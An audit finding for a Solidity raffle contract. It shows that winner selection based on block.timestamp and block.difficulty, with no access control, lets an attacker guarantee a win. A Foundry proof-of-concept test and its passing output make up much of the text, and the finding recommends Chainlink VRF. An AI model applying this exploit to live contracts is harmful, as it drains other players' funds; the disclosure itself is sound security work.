## [High - Lost of Funds] Using on-chain data to pick the winner leads to knowing the winner in advance

### Severity

High Risk

### Date Modified

Oct 28th, 2023

### Summary

Blockchain is a deterministic technology, so there is no randomness and no way to create random data for a lottery or similar application.

But not only that. The fact that the function does not have any kind of access control made it possible for an attacker to execute it at any time, choosing the right block.timestamp and block.difficulty to suit his/her interest.

### Vulnerability Details (PoC)

This contract, within the selectWinner() function, uses on-chain data 2 times:

```
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

And

```
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

Take this test as an example:

```

function test_selectWinnerNoRandomness() external playerEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 afterIndex = uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty)));
        uint256 afterIndex4 = afterIndex % 4;
        uint256 afterIndex5 = afterIndex % 5;

        console.log("afterIndex4: ", afterIndex4); // afterIndex4:  1
        console.log("afterIndex5: ", afterIndex5); // afterIndex4:  4 ok!!!

        // Note: It is more elegant To use a script or a loop but this is only for PoC

        // The attacker has found that in a 5 player game the position to take is 5.
        address[] memory playerAttack = new address[](4);
        playerAttack[0] = playerTwo;
        playerAttack[1] = playerThree;
        playerAttack[2] = playerFour;
        playerAttack[3] = attacker;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(playerAttack);

        uint256 contractBalance = address(puppyRaffle).balance;
        uint256 attackerBalance = address(attacker).balance;

        // The attacker should execute the function himself to use his/her address!
        vm.prank(attacker);
        puppyRaffle.selectWinner();

        assertEq(attacker.balance, attackerBalance + ((contractBalance * 80) / 100));
    }
```

```
➜  2023-10-Puppy-Raffle git:(main) ✗ forge test --mt test_selectWinnerNoRandomness
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/PRTEst.t.sol:PRTEst
[PASS] test_selectWinnerNoRandomness() (gas: 303697)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.27ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

As we can see, after finding the relationship between global variables + own address + number of players, the attacker is able to attack the contract and win the prize with 100% effectiveness.

The same goes for rarity. The attacker is able to find the relationship between the address and the difficulty and get the desired rarity.

### Impact

Any attacker can set up their account in the right place so that they always win the raffle, so that it is no longer a "lottery" but a scam for the other users.

### Tools Used

Foundry, terminal.

### Recommendations

We don't know if this was intended by the developers, but it is highly recommended to secure the function with Open Zeppelin libraries such as onlyOwner or AccessControl. This will help to control the damage.

But the only real way to avoid the high-risk vulnerability is to use an oracle instead of on-chain data for randomness.

The most widely used and tested oracle for these cases is the Chainlink VRF, and it is possible to consult the documentation for it here:

https://docs.chain.link/vrf
